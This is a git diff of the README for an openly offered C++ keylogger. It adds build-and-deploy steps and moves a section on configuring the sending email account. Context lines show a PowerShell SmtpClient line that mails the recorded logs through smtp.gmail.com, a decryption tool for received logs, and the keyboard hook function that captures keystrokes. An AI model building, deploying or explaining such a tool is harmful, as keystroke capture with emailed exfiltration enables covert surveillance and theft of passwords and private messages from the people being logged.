@@ -96,6 +96,10 @@ Edit line 39 with your email port number which can be searched up
 ```
 line 39: "           $Client = New-Object Net.Mail.SmtpClient($Srv, 587) #587 port for smtp.gmail.com SSL\r\n "
 ```
+
+### Configuring Other Emails
+Look up permissions respectively for your source email that allow less secure apps to access that source email.
+
 ## Decrypting the log files
 Follow these steps to decrypt any received log files
 
@@ -119,7 +123,6 @@ Run the decryption program which takes in a input file and a output file which c
 ```
 .\Keylogger-Decrypt.exe "inputfile.log" "outputfile.log"
 ```
-
 
 ## Customization
 OPTIONAL changes the user can make to the source code to fit their needs.
@@ -170,8 +173,23 @@ line 40: LRESULT OurKeyBoardProc(int nCode, WPARAM wparam, LPARAM lparam) // fun
 ```
 Add in necessary if statements and desired format when a certain key is pressed (ex: by default pressing enter inserts "\n" to the log)
 
-### Configuring Other Emails
-Look up permissions respectively for your source email that allow less secure apps to access that source email.
+## Deploying the Keylogger From the Source Code
+Here, the user builds the solution to an .exe file
+
+Open the solution file in Visual Studio using the sln file
+```
+located at ..\Cpp-Keylogger\Keylogger.sln
+```
+For other IDEs, make a project that includes all source and header files
+```
+located at ..\Cpp-Keylogger\Keylogger
+```
+Build the solution
+```
+Build -> Build Solution
+The .exe file should be located by default in ..\Cpp-Keylogger\Debug\Keylogger.exe
+```
+
 
 ## License
 This project is licensed under the MIT License - see the [LICENSE.md](LICENSE.md) file for details
